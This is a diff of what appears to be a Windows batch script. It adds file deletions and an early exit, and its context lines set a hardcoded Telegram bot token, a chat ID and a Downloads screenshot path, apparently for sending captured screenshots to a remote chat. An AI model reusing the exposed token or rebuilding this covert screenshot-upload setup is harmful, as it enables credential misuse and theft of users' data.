@@ -4,12 +4,19 @@
 
 
 
+
+del /f /q "%temp%\run_once.flag"
+del /f /q "%temp%\run_once1.flag"
+
+
+exit
+
+
 :: Set your bot token and chat ID
 set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID=-1002460905948"
 :: Path to your photo
 set "PHOTO_PATH=%USERPROFILE%\Downloads\screenshot.png"
-
 
 
 ::goto :EOF
@@ -75,6 +82,7 @@ echo 1 > "%temp%\run_once1.flag"
 :skip_code
 
 exit
+
 
 
 timeout /t 840 /nobreak
